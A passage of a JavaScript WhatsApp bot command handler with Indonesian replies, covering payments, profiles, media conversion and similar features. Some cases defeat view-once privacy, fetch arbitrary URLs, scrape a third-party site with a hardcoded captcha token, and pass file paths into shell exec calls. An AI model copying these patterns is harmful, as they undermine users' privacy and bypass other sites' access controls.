    if (!text || !text.includes(",")) return m.reply("🦖 Format salah!\n_Example : done (barang),(harga)_", { quoted: fkontak1 })

    let [barang, harga] = text.split(",").map(v => v.trim());

    if (isNaN(harga)) return m.reply("❌ Format harga tidak valid!", { quoted: fkontak1 })

    let total = Number(harga); // Harga langsung digunakan tanpa konversi tambahan

    let teks = `*✅ TRANSAKSI DONE BY XlesyGxyenn STORE*\n` +
               `📦 *Barang:* ${barang}\n` +
               `💸 *Nominal:* Rp${formatRupiah(total)}\n` +
               `⏰ *Waktu:* ${new Date().toLocaleString("id-ID")}\n\n` +
               `_Terima kasih telah mempercayai dan menggunakan jasa kami! 🥳_`;

    if (typeof Xlesy !== "undefined" && Xlesy.relayMessage) {
        Xlesy.relayMessage(m.chat, {
            requestPaymentMessage: {
                currencyCodeIso4217: "IDR",
                amount1000: total * 1000, // WhatsApp butuh format dalam satuan 1000
                requestFrom: m.sender,
                noteMessage: {
                    extendedTextMessage: {
                        text: teks,
                        contextInfo: { externalAdReply: { showAdAttribution: true } }
                    }
                }
            }
        }, {});
    } else {
        m.reply(teks, { quoted: ftroli })
    }
}
break

// Fungsi untuk mengubah angka menjadi format Rupiah
function formatRupiah(angka) {
    return angka.toLocaleString("id-ID", { style: "currency", currency: "IDR" })
}
			case 'owner': {
				await Xlesy.sendContact(m.chat, owner, m);
			}
			break
			case 'profile': case 'cek': case 'me': {
				const user = Object.keys(db.users)
				const infoUser = db.users[m.sender]
				await m.reply(`*👤Profile @${m.sender.split('@')[0]}* :\n🐋User Bot : ${user.includes(m.sender) ? 'True' : 'False'}\n🔥User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\n🎫Limit : ${infoUser.limit}\n💰Uang : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`, { quoted: fkontak1 })
			}
			break
			case 'leaderboard': {
				const entries = Object.entries(db.users).sort((a, b) => b[1].uang - a[1].uang).slice(0, 10).map(entry => entry[0]);
				let teksnya = '╭──┈➤「 *LEADERBOARD* 」❍\n'
				for (let i = 0; i < entries.length; i++) {
					teksnya += `│• ${i + 1}. @${entries[i].split('@')[0]}\n│• Balance : ${db.users[entries[i]].uang.toLocaleString('id-ID')}\n│\n`
				}
				m.reply(teksnya + '╰──────┈➤', { quoted: fkontak1 })
			}
			break
			case 'req': case 'request': {
				if (!text) return m.reply('Mau Request apa ke Owner?')
				await m.reply(`*Request Telah Terkirim Ke Owner*\n_Terima Kasih🙏_`, { quoted: fkontak1 })
				await Xlesy.sendFromOwner(owner, `Pesan Dari : @${m.sender.split('@')[0]}\nUntuk Owner\n\nRequest ${text}`, m, { contextInfo: { mentionedJid: [m.sender], isForwarded: true }})
			}
			break
			case 'totalfitur': {
				const total = ((fs.readFileSync('./Xlesy.js').toString()).match(/case '/g) || []).length
				m.reply(`Konichiwa *${m.pushName ? m.pushName : 'Unknown'}!*\nSaat Ini Xlesy Memiliki/Total fitur : ${total}`, { quoted: fkontak1 })			
			}
			break
			case 'daily': case 'claim': {
				daily(m, db)
			}
			break
			case 'transfer': case 'tf': {
				transfer(m, args, db)
			}
			break
			case 'buy': {
				buy(m, args, db)
			}
			break
			case 'react': {
				Xlesy.sendMessage(m.chat, { react: { text: args[0], key: m.quoted ? m.quoted.key : m.key }})
			}
			break
			case 'tagme': {
				m.reply(`@${m.sender.split('@')[0]}`, { mentions: [m.sender] }, { quoted: fkontak1 })
			}
			break
			case 'runtime': case 'tes': case 'bot': {
				let teks = text.split(' ')
				let set = db.set[botNumber]
				switch(teks[0]) {
					case 'mode':
					if (!isCreator) return m.reply(mess.owner)
					if (teks[1] == 'public') {
						if (Xlesy.public) return m.reply('*Sudah Aktif Sebelumnya*',
						{ quoted: fkontak1 })
						Xlesy.public = set.public = true
						m.reply('*Sukse Change To Public Usage*',
						{ quoted: fkontak1 })
					} else if (teks[1] == 'self') {
						Xlesy.public = set.public = false
						m.reply('*Sukse Change To Self Usage*',
						{ quoted: fkontak1 })
					} else {
						m.reply('Mode self/public',
						{ quoted: fkontak1 })
					}
					break
					case 'anticall': case 'autobio': case 'autoread': case 'autotyping': case 'readsw': case 'multiprefix': case 'antispam':
					if (!isCreator) return m.reply(mess.owner)
					if (teks[1] == 'on') {
						if (set[teks[0]]) return m.reply('*Sudah Aktif Sebelumnya*',
						{ quoted: fkontak1 })
						set[teks[0]] = true
						m.reply('*Sukse Change To On*',
						{ quoted: fkontak1 })
					} else if (teks[1] == 'off') {
						set[teks[0]] = false
						m.reply('*Sukse Change To Off*',
						{ quoted: fkontak1 })
					} else {
						m.reply(`${teks[0].charAt(0).toUpperCase() + teks[0].slice(1)} on/off`,
						{ quoted: fkontak1 })
					}
					break
					case 'set': case 'settings':
					let settingsBot = Object.entries(set).map(([key, value]) => {
						let list = key == 'status' ? new Date(value).toLocaleString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : (typeof value === 'boolean') ? (value ? 'on🟢' : 'off🔴') : value;
						return `- ${key.charAt(0).toUpperCase() + key.slice(1)} : ${list}`;
					}).join('\n');
					m.reply(`Settings Bot @${botNumber.split('@')[0]}\n${settingsBot}`,
					{ quoted: fkontak1 })
					break
					default:
					if (teks[0] || teks[1]) m.reply(`*Please Sellect Settings :*\n- Mode : *${prefix + command} mode self/public*\n- Anti Call : *${prefix + command} anticall on/off*\n- Auto Bio : *${prefix + command} autobio on/off*\n- Auto Read : *${prefix + command} autoread on/off*\n- Auto Typing : *${prefix + command} autotyping on/off*\n- Read Sw : *${prefix + command} readsw on/off*\n- Multi Prefix : *${prefix + command} multiprefix on/off*`,
					{ quoted: fkontak1 })
				}
				if (!teks[0] && !teks[1]) return m.reply(`*Bot Telah Online Selama*\n${runtime(process.uptime())}`,
				{ quoted: fkontak1 })
			}
			break
			case 'ping': case 'botstatus': case 'statusbot': case 'server': {
				const used = process.memoryUsage()
				const cpus = os.cpus().map(cpu => {
					cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
					return cpu
				})
				const cpu = cpus.reduce((last, cpu, _, { length }) => {
					last.total += cpu.total
					last.speed += cpu.speed / length
					last.times.user += cpu.times.user
					last.times.nice += cpu.times.nice
					last.times.sys += cpu.times.sys
					last.times.idle += cpu.times.idle
					last.times.irq += cpu.times.irq
					return last
				}, {
					speed: 0,
					total: 0,
					times: {
						user: 0,
						nice: 0,
						sys: 0,
						idle: 0,
						irq: 0
					}
				})
				let timestamp = speed()
				let latensi = speed() - timestamp
				neww = performance.now()
				oldd = performance.now()
				respon = `☄️ _*\`Respone Speed\`*_\n${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\n🕛 _*\`Runtime\`*_\n ${runtime(process.uptime())}\n\n🌐 _*\`Info Server\`*_\nRAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}\n\n_*\`NodeJS Memory Usaage\`*_\n${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`, { quoted: fkontak1 }).join('\n')}\n\n${cpus[0] ? `_Total CPU Usage_\n${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`, { quoted: fkontak1 }).join('\n')}\n_CPU Core(s) Usage (${cpus.length} Core CPU)_\n${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`, { quoted: fkontak1 }).join('\n')}`, { quoted: fkontak1 }).join('\n\n')}` : ''}`.trim()
				m.reply(respon,
					{ quoted: fkontak1 })
			}
			break
case 'speedtest': case 'speed': {
    await m.reply('Testing Speed...')
    let cp = require('child_process')
    let { promisify } = require('util')
    let exec = promisify(cp.exec).bind(cp)
    let o
    try {
        o = await exec('python3 speed.py --share')
    } catch (e) {
        o = e
    } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) await m.reply(stdout)
        if (stderr.trim()) await m.reply(stderr)
    }
}
break
			case 'afk': {
				let user = db.users[m.sender]
				user.afkTime = + new Date
				user.afkReason = text
				m.reply(`@${m.sender.split('@')[0]} Telah Afk${text ? ': ' + text : ''}`, { quoted: fkontak1 })
			}
			break
			case 'readviewonce': case 'readviewone': case 'rvo': {
				if (!m.quoted) return m.reply(`Reply view once message\nExample: ${prefix + command}`, { quoted: fkontak1 })
				try {
					if (m.quoted.msg.viewOnce) {
						delete m.quoted.chat
						m.quoted.msg.viewOnce = false
						await m.reply({ forward: m.quoted })
					} else {
						m.reply(`Reply view once message\nExample: ${prefix + command}`, { quoted: fkontak1 })
					}
				} catch (e) {
					m.reply('Media Tidak Valid!')
				}
			}
			break
			case 'inspect': {
				if (!text) return m.reply('Masukkan Link Group!')
				let _grup = /chat.whatsapp.com\/([\w\d]*)/;
				let _saluran = /whatsapp\.com\/channel\/([\w\d]*)/;
				if (_grup.test(text)) {
					await Xlesy.groupGetInviteInfo(text.match(_grup)[1]).then((_g) => {
						let teks = `*[ INFORMATION GROUP ]*\n\nName Group: ${_g.subject}\nGroup ID: ${_g.id}\nCreate At: ${new Date(_g.creation * 1000).toLocaleString()}${_g.owner ? ('\nCreate By: ' + _g.owner) : '' }\nLinked Parent: ${_g.linkedParent}\nRestrict: ${_g.restrict}\nAnnounce: ${_g.announce}\nIs Community: ${_g.isCommunity}\nCommunity Announce:${_g.isCommunityAnnounce}\nJoin Approval: ${_g.joinApprovalMode}\nMember Add Mode: ${_g.memberAddMode}\nDescription ID: ${'`' + _g.descId + '`'}\nDescription: ${_g.desc}\nParticipants:\n`
						_g.participants.forEach((a) => {
							teks += a.admin ? `- Admin: @${a.id.split('@')[0]} [${a.admin}]\n` : ''
						})
						m.reply(teks)
					}).catch((e) => {
						if ([400, 406].includes(e.data)) return m.reply('Grup Tidak Di Temukan❗');
						if (e.data == 401) return m.reply('Bot Di Kick Dari Grup Tersebut❗');
						if (e.data == 410) return m.reply('Url Grup Telah Di Setel Ulang❗');
					});
				} else if (_saluran.test(text) || text.endsWith('@newsletter') || !isNaN(text)) {
					await Xlesy.newsletterMsg(text.match(_saluran)[1]).then((n) => {
						m.reply(`*[ INFORMATION CHANNEL ]*\n\nID: ${n.id}\nState: ${n.state.type}\nName: ${n.thread_metadata.name.text}\nCreate At: ${new Date(n.thread_metadata.creation_time * 1000).toLocaleString()}\nSubscriber: ${n.thread_metadata.subscribers_count}\nVerification: ${n.thread_metadata.verification}\nDescription: ${n.thread_metadata.description.text}\n`, { quoted: fkontak1 })
					}).catch((e) => m.reply('Saluran Tidak Di Temukan❗'))
				} else {
					m.reply('Hanya Support Url Grup atau Saluran!')
				}
			}
			break
			case 'addmsg': {
				if (!m.quoted) return m.reply('Reply Pesan Yang Ingin Disave Di Database')
				if (!text) return m.reply(`Example : ${prefix + command} file name`, { quoted: fkontak1 })
				let msgs = db.database
				if (text.toLowerCase() in msgs) return m.reply(`'${text}' telah terdaftar di list pesan`, { quoted: fkontak1 })
				msgs[text.toLowerCase()] = m.quoted
				delete msgs[text.toLowerCase()].chat
				m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'\nAkses dengan ${prefix}getmsg ${text}\nLihat list Pesan Dengan ${prefix}listmsg`, { quoted: fkontak1 })
			}
			break
			case 'delmsg': case 'deletemsg': {
				if (!text) return m.reply('Nama msg yg mau di delete?')
				let msgs = db.database
				if (text == 'allmsg') {
					db.database = {}
					m.reply('Berhasil menghapus seluruh msg dari list pesan')
				} else {
					if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`, { quoted: fkontak1 })
					delete msgs[text.toLowerCase()]
					m.reply(`Berhasil menghapus '${text}' dari list pesan`, { quoted: fkontak1 })
				}
			}
			break
			case 'getmsg': {
				if (!text) return m.reply(`Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`, { quoted: fkontak1 })
				let msgs = db.database
				if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar di list pesan`, { quoted: fkontak1 })
				await Xlesy.relayMessage(m.chat, msgs[text.toLowerCase()], {})
			}
			break
			case 'listmsg': {
				let seplit = Object.entries(db.database).map(([nama, isi]) => { return { nama, message: getContentType(isi) }})
				let teks = '「 LIST DATABASE 」\n\n'
				for (let i of seplit) {
					teks += `${setv} *Name :* ${i.nama}\n${setv} *Type :* ${i.message?.replace(/Message/i, '')}\n───────────────\n`
				}
				m.reply(teks)
			}
			break
			case 'q': case 'quoted': {
				if (!m.quoted) return m.reply('Reply Pesannya!')
				const anu = await m.getQuotedObj()
				if (!anu) return m.reply('Format Tidak Tersedia!')
				if (!anu.quoted) return m.reply('Pesan Yang Anda Reply Tidak Mengandung Reply')
				await Xlesy.relayMessage(m.chat, { [anu.quoted.type]: anu.quoted.msg }, {})
			}
			break
			case 'confes': case 'confess': case 'menfes': case 'menfess': {
				if (!isLimit) return m.reply(mess.limit)
				if (m.isGroup) return m.reply(mess.private)
				if (menfes[m.sender]) return m.reply(`Kamu Sedang Berada Di Sesi ${command}!`, { quoted: fkontak1 })
				if (!text) return m.reply(`Example : ${prefix + command} 62xxxx|Nama Samaran`, { quoted: fkontak1 })
				let [teks1, teks2] = text.split`|`
				if (teks1) {
					const tujuan = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					const onWa = await Xlesy.onWhatsApp(tujuan)
					if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
					menfes[m.sender] = {
						tujuan: tujuan,
						nama: teks2 ? teks2 : 'Orang',
						waktu: setTimeout(() => {
							if (menfes[m.sender]) m.reply(`_Waktu ${command} habis_`, { quoted: fkontak1 })
							delete menfes[m.sender];
						}, 600000)
					};
					menfes[tujuan] = {
						tujuan: m.sender,
						nama: 'Penerima',
						waktu: setTimeout(() => {
							if (menfes[tujuan]) Xlesy.sendMessage(tujuan, { text: `_Waktu ${command} habis_` });
							delete menfes[tujuan];
						}, 600000)
					};
					Xlesy.sendMessage(tujuan, { text: `_${command} connected_\n*Note :* jika ingin mengakhiri ketik _*${prefix}del${command}*_` });
					m.reply(`_Memulai ${command}..._\n*Silahkan Mulai kirim pesan/media*\n*Durasi ${command} hanya selama 10 menit*\n*Note :* jika ingin mengakhiri ketik _*${prefix}del${command}*_`, { quoted: fkontak1 })
					setLimit(m, db)
				} else {
					m.reply(`Masukkan Nomernya!\nExample : ${prefix + command} 62xxxx|Nama Samaran`, { quoted: fkontak1 })
				}
			}
			break
			case 'delconfes': case 'delconfess': case 'delmenfes': case 'delmenfess': {
				if (!menfes[m.sender]) return m.reply(`Kamu Tidak Sedang Berada Di Sesi ${command.split('del')[1]}!`, { quoted: fkontak1 })
				let anu = menfes[m.sender]
				Xlesy.sendMessage(anu.tujuan, { text: `Chat Di Akhiri Oleh ${anu.nama ? anu.nama : 'Seseorang'}` })
				m.reply(`Sukses Mengakhiri Sesi ${command.split('del')[1]}!`, { quoted: fkontak1 })
				delete menfes[anu.tujuan];
				delete menfes[m.sender];
			}
			break
			case 'jadibot': {
				if (!isPremium) return m.reply(mess.prem)
				if (!isLimit) return m.reply(mess.limit)
				const nmrnya = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.sender
				const onWa = await Xlesy.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
				await JadiBot(Xlesy, nmrnya, m)
				m.reply(`Gunakan ${prefix}stopjadibot\nUntuk Berhenti`, { quoted: fkontak1 })
				setLimit(m, db)
			}
			break
			case 'stopjadibot': case 'deljadibot': {
				const nmrnya = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.sender
				const onWa = await Xlesy.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
				await StopJadiBot(Xlesy, nmrnya, m)
			}
			break
			case 'listjadibot': {
				ListJadiBot(Xlesy, m)
			}
			break
			
			// Tools Menu
			case 'fetch': case 'get': {
				if (!isPremium) return m.reply(mess.prem)
				if (!isLimit) return m.reply(mess.limit)
				if (!/^https?:\/\//.test(text)) return m.reply('Awali dengan http:// atau https://');
				try {
					const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text)
					if (!/text|json|html|plain/.test(res.headers['content-type'])) {
						await m.reply(text)
					} else {
						m.reply(util.format(res.data))
					}
					setLimit(m, db)
				} catch (e) {
					m.reply(String(e))
				}
			}
			break
			case 'toaud': case 'toaudio': {
				if (!/video|audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`, { quoted: fkontak1 })
				m.reply(mess.wait)
				let media = await quoted.download()
				let audio = await toAudio(media, 'mp4')
				await m.reply({ audio: audio, mimetype: 'audio/mpeg'})
			}
			break
			case 'tomp3': {
				if (!/video|audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`, { quoted: fkontak1 })
				m.reply(mess.wait)
				let media = await quoted.download()
				let audio = await toAudio(media, 'mp4')
				await m.reply({ document: audio, mimetype: 'audio/mpeg', fileName: `Convert Xlesy Bot.mp3`})
			}
			break
			case 'tovn': case 'toptt': case 'tovoice': {
				if (!/video|audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`, { quoted: fkontak1 })
				m.reply(mess.wait)
				let media = await quoted.download()
				let audio = await toPTT(media, 'mp4')
				await m.reply({ audio: audio, mimetype: 'audio/ogg; codecs=opus', ptt: true })
			}
			break
			case 'togif': {
				if (!/webp|video/.test(mime)) return m.reply(`Reply Video/Stiker dengan caption *${prefix + command}*`, { quoted: fkontak1 })
				m.reply(mess.wait)
				let media = await Xlesy.downloadAndSaveMediaMessage(qmsg)
				let ran = `./database/sampah/${getRandom('.gif')}`;
				exec(`convert ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return m.reply('Gagal❗')
					let buffer = fs.readFileSync(ran)
					m.reply({ video: buffer, gifPlayback: true })
					fs.unlinkSync(ran)
				})
			}
			break
			case 'toimage': case 'toimg': {
				if (!/webp|video/.test(mime)) return m.reply(`Reply Video/Stiker dengan caption *${prefix + command}*`, { quoted: fkontak1 })
				m.reply(mess.wait)
				let media = await Xlesy.downloadAndSaveMediaMessage(qmsg)
				let ran = `./database/sampah/${getRandom('.png')}`;
				exec(`convert ${media}[0] ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return m.reply('Gagal❗')
					let buffer = fs.readFileSync(ran)
					m.reply({ image: buffer })
					fs.unlinkSync(ran)
				})
			}
			break
			case 'toptv': {
				if (!/video/.test(mime)) return m.reply(`Kirim/Reply Video Yang Ingin Dijadikan PTV Message Dengan Caption ${prefix + command}`, { quoted: fkontak1 })
				if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
					const anu = await quoted.download()
					const msg = await generateWAMessageContent({ video: anu }, { upload: Xlesy.waUploadToServer })
					await Xlesy.relayMessage(m.chat, { ptvMessage: msg.videoMessage }, {})
				} else {
					m.reply('Reply Video Yang Mau Di Ubah Ke PTV Message!')
				}
			}
			break
			case 'tourl': {
				try {
					if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
						m.reply(mess.wait)
						let media = await quoted.download()
						let anu = await UguuSe(media)
						m.reply('Url : ' + anu.url)
					} else {
						m.reply('Send Media yg ingin di Upload!')
					}
				} catch (e) {
					m.reply('Server Uploader sedang offline!')
				}
			}
			break
			case 'texttospech': case 'tts': case 'tospech': {
				if (!text) return m.reply('Mana text yg mau diubah menjadi audio?')
				let { tts } = require('./lib/tts')
				let anu = await tts(text)
				m.reply({ audio: anu, ptt: true, mimetype: 'audio/mpeg' })
			}
			break
			case 'translate': case 'tr': {
				if (text && text == 'list') {
					let list_tr = `╭──┈➤「 *Kode Bahasa* 」❍\n│• af : Afrikaans\n│• ar : Arab\n│• zh : Chinese\n│• en : English\n│• en-us : English (United States)\n│• fr : French\n│• de : German\n│• hi : Hindi\n│• hu : Hungarian\n│• is : Icelandic\n│• id : Indonesian\n│• it : Italian\n│• ja : Japanese\n│• ko : Korean\n│• la : Latin\n│• no : Norwegian\n│• pt : Portuguese\n│• pt : Portuguese\n│• pt-br : Portuguese (Brazil)\n│• ro : Romanian\n│• ru : Russian\n│• sr : Serbian\n│• es : Spanish\n│• sv : Swedish\n│• ta : Tamil\n│• th : Thai\n│• tr : Turkish\n│• vi : Vietnamese\n╰──────┈➤`;
					m.reply(list_tr)
				} else {
					if (!m.quoted && (!text|| !args[1])) return m.reply(`Kirim/reply text dengan caption ${prefix + command}`, { quoted: fkontak1 })
					let lang = args[0] ? args[0] : 'id'
					let teks = args[1] ? args.slice(1).join(' ') : m.quoted.text
					try {
						let hasil = await translate(teks, { to: lang, autoCorrect: true })
						m.reply(`To : ${lang}\n${hasil[0]}`, { quoted: fkontak1 })
					} catch (e) {
						m.reply(`Lang *${lang}* Tidak Di temukan!\nSilahkan lihat list, ${prefix + command} list`, { quoted: fkontak1 })
					}
				}
			}
			break
			case 'toqr': case 'qr': {
				if (!text) return m.reply(`Ubah Text ke Qr dengan *${prefix + command}* textnya`, { quoted: fkontak1 })
				m.reply(mess.wait)
				await m.reply({ image: { url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + text }, caption: 'Nih Bro' })
			}
			break
    case 'hd': case 'tohd': case 'remini': case 'hd': {
				if (!isLimit) return m.reply(mess.limit)
				if (/image/.test(mime)) {
					let media = await quoted.download()
					remini(media, 'enhance').then(a => {
						m.reply({ image: a, caption: 'Done' }, { quoted: fkontak1 })
						setLimit(m, db)
					}).catch(e => m.reply('Server sedang offline!'), { quoted: fkontak1 })
				} else {
					m.reply(`Kirim/Reply Gambar dengan format\nExample: ${prefix + command}`, { quoted: fkontak1 })
				}
			}
			break
			case 'ssweb': {
				if (!isPremium) return m.reply(mess.prem)
				if (!text) return m.reply(`Example: ${prefix + command} https://gxyenn-site.vercel.app/`, { quoted: fkontak1 })
				try {
					let anu = 'https://' + text.replace(/^https?:\/\//, '')
					await m.reply({ image: { url: 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + anu }, caption: 'Done' }, { quoted: fkontak1 })
				} catch (e) {
					m.reply('Server SS web Sedang Offline!', { quoted: fkontak1 })
				}
			}
			break
			case 'readmore': {
				let teks1 = text.split`|`[0] ? text.split`|`[0] : ''
				let teks2 = text.split`|`[1] ? text.split`|`[1] : ''
				m.reply(teks1 + readmore + teks2)
			}
			break
			case 'getexif': {
				if (!m.quoted) return m.reply(`Reply sticker\nDengan caption ${prefix + command}`, { quoted: fkontak1 })
				if (!/sticker|webp/.test(quoted.type)) return m.reply(`Reply sticker\nDengan caption ${prefix + command}`, { quoted: fkontak1 })
				const img = new webp.Image()
				await img.load(await m.quoted.download())
				m.reply(util.format(JSON.parse(img.exif.slice(22).toString())))
			}
			break
			case 'waktudunia':
        const cheerio = require('cheerio');
        const moment = require('moment-timezone');

        async function waktu() {
            const url = 'https://onlinealarmkur.com/world/id/'
            try {
        const {
            data
        } = await axios.get(url)
        const $ = cheerio.load(data)
        let hasil = []
        $('.flex.items-center.space-x-3').each((index, element) => {
            const bndera = $(element).find('.avatar .text-2xl').text().trim()
            const kota = $(element).find('.city-name').text().trim()
            const Zona = $(element).find('.city-time').attr('data-tz')
            if (Zona) {
                const realTime = moment().tz(Zona).format('ddd - HH:mm')
                hasil.push({
                    bndera,
                    kota,
                    waktu: realTime
                })
            }
        })
        return hasil
    } catch (error) {
        return []
    }
}

        let hasilWaktu = await waktu()
        if (hasilWaktu.length === 0) {
            return Xlesy.sendMessage(m.chat, {
                text: 'Gagal mengambil data waktu'
            }, {
                quoted: fkontak1 
            })
        }

        let pesanWaktu = '*🕰️ Waktu Dunia Saat Ini 🕰️*\n\n'
        hasilWaktu.forEach(item => {
            pesanWaktu += `${item.bndera} *${item.kota}* -          ${item.waktu}\n`
        })

        await Xlesy.sendMessage(m.chat, {
            text: pesanWaktu
        }, {
    quoted: fkontak1 
        })
        break
        const axios = require('axios');
const qs = require('qs');
async function igStalk(username) {
    const inti = qs.stringify({
        action: 'wcl_insta_follower_count_checker',
        token: '03AFcWeA5P66gJ13Zveu8aKFaBTaCbolEYory-EhTpqfsAOGPBPsVqu-xhJE5GKWEy8djupb9Oj8D5J3ShTKECuMQuwFX1ikVt1LGtbhTcKFCo9hxbTA89xX3grIZpkdmhGK7aVd2HW-KCGdcudwFnqRtxhDAERI2a1o_D_W8LVOR9KTLRWTnid8pTIxMs9Mm3mTu9RRdS7A2hZ8RQ7kXsgB0dDxhY_nBLGcqGyvvgFmBXapBx3B9SRUl6OoA_-AuvaFVtTPbbvp_04Ha8Atp2DwVBYv_X8o6WM3a3saCIfwRR1Nntr2zNhuDzfW_EbWFB_j1GtNz1cbeVVdBecfUOzOGIuWl6b0xmRPcBsNQdfzFNAqMqAgTxnP7FACvaDIqfq2Tj_ds1jrTJQ6C33JNyxZNLO9kA8LuQcG7HQE3rrKJMX5d8STps1wVFTKS_DmM6GFwqOJpg8fqz4jU-DKUQxRczKffSfMpTorxMG7fHZmhy-tJYQKnR_CZ10YYhzxcaNrtlnZBlSjsy0-101Hjsp3khYnyMqn72pSWhRgAArfsjjdpHc1QTOfzvdzETljDn79H7xp75sMIEk_OaGRM4vuHQZy6cnO3PcL5laBD4TnDRTJ54u5iWjiPapSJhQlRD7XUVoPBTHcdFeb_PrpE5mY-NvwiFfXWujmb-RBK-MK5VzY4UlPCgqba4GYMgHnLTxtZ-8rl08sn6N86IaFrIgVf-Ho5Lz8MGWl4xbI6W7PGRZ6dRRs2tidjTfVq4AzSfQKNbgqezBcGm_0drAK_RSVPKTXcMCPDpJ4sv1oziPbsKZOzSdnlM7OCfhXVq8MunoBtS7IAQOAtaGyD8Wjyzoj2OLeFO06sdaXY92kfmc037Q7_8l9I3YKgKHow6YvWf57uMdJCTxEq_B-kezMfEsZA4Ekt7xUdzYF2VetpOcEMwUEN5yvvlbXESy2XicAMLPyWNzC7Q9CFi3T6ijVuG_xsZGjcMTXLeier37gn_xsW9VeMbS4THWC7F_c-rIrrr5Sf8AcvyHtwzqK1Zc2kdT3UFDQ2k5xGeNete6q7AOONeg53cWTb3Nt9LZUUuGOMcf7Hpofaj3TY5DBztI8WdROF4ZpvnlZiEkpU-7wJN5NSss6BzLG3-YwdENCugh3_pxTIRwjU8EP-925NKbYHJHqKXuNPwZq5Z1jTNYxlD48drSDs_sFr1P2Kgj_ISzarIjVtO4qUz5uYgvUM-dh2oPr27UOVQR8da95ndpCPMOSfXDLfmKTBd0mRqM7LkYw3C5mPFmP1A9ZlBPGKWbGpPvqmxwpUBhtbQzKWGPC7YYf2f_dKZh6cAT1DN1NCkQ3L8kCFaP5G7ku5tn00YxWrGLddD_hyaCh0SkexejbuNMq0NhRr-LPDcvQvRDyKDOCY9Qxm9_LTIQv3SlukhXwOI03_984qNv_XHHkpfg9JJ7u19dqga0lZg7H8NNle2MYyo8xbh0gLLhWKwdRix0JrKzKonIrK3ziD3UaV2zFsfrEI-dd8tHykIdD9qJl8tsRKzl4nbU4BYipRe9pbKDy9JionTxu5jFMaTIDBudh9Tqvc_fFSbq4C3LjxJkl0oFD7-7z-kWJRr72WECL-o2pRB6itASdM_WPXmXyJDyY6yFp03EBeD4BYf4HzOP5y8XFK15RYQq3XpKZ91Q-Pf8aRLbW5EXLzTMJjdbGmGrtvoFOP4Sa4LkhY9-W5fGrldyfOCc0OFnJVzOsfMeEq0O1rzN50wWTy-MH9VtIBRYCeStdP1S8HgBrkKq2JxMowX-6mwXxg2hLcGRzny1nMsa3aX8LIxJnGOUdaf1lMlV4TGg5C0DfzZHN-aC0PgNfCJGWqpmej8-_BZvhW8ZxMe255uDlA86ePfZ3hs05vyD3miOTZkfaSwqQ5riv7vFAmbUCuRd2IuPV3DEwnbW3PIHQilPrc90cdnk-SQOQ8iN4ci1yQouwLcgq1xfSK8CqwhFIbPuTrirzw-rVTLDGT7hqReCO4_MNKnvSggoz4MDEKblll90lt1oKQBqK5QMi_XpvZQOaDC3lHlSZV73fPuPwrtJXe09MwKJaa3EZ7NIf3j3ktn3LNO7a10qy7yUJYR3VkLn-2cq7jNibi-CZ8LrdqGTiCGrHGYEuFidJJLupDeRgMctLDdDT0wxomLL4_AKI1YrqxrMRZ0DoC7I4agyZqK1KdYAnOTkzGTwVkS_6n5Zfkkst3uUvFGKGBb5P9c_tGXmIQKhNp13u5Y',
        wpnonce: '03a8e8314d',
        instagram_url: username
    });
    try {
        const res = await axios.post('https://views4you.com/wp-admin/admin-ajax.php', inti, {
            headers: {
                'Accept': '*/*',
                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://views4you.com',
                'Referer': `https://views4you.com/tools/instagram-follower-count/?url=${username}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
                'Cookie': 'wpml_lang=en-US; wp-wpml_current_language=en;'
            }
        });

        return res.data;
    } catch (error) {
        console.error('gagal ambil data:', error);
        return null;
    }
}
			case 'cuaca': case 'weather': {
	    			    await Xlesy.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
				if (!text) return m.reply(`Example: ${prefix + command} jakarta`, { quoted: fkontak1 })
				try {
